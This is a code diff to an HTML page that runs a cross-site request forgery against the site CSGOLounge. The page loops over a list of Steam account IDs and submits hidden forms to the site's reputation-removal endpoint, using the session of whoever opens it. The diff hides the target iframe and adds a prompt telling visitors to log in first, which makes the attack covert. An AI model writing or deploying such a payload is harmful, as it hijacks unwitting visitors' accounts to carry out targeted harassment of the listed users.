@@ -3,6 +3,7 @@
 
 </head>
 <body>
+<div>For this to work, you must be logged in CSGOLounge. If you just did that, refresh this page again.</div>
 <div id="placeholder"></div>
 <script type="text/javascript">
     var rep = {"76561197992873350": "negative", "76561198038862866": "negative", "76561197983600912": "negative", "76561198033008732": "negative", "76561198053191512": "negative"};
@@ -10,7 +11,7 @@
             '<input type="hidden" name="id" value="{id}"/>' +
             '<input type="hidden" name="reason" value="Remember, remember the 5th of November. The gunpowder treason and plot. I know of no reason why the gunpowder treason should ever be forgot."/>' +
             '</form>' +
-            '<iframe name="{frame}" src="http://csgolounge.com/ajax/removeReputation.php"></iframe>';
+            '<iframe name="{frame}" src="http://csgolounge.com/ajax/removeReputation.php" style="display: none;"></iframe>';
     for (var key in rep) {
         var profileNumber = key;
         var newDirtyShit = dirtyShit;
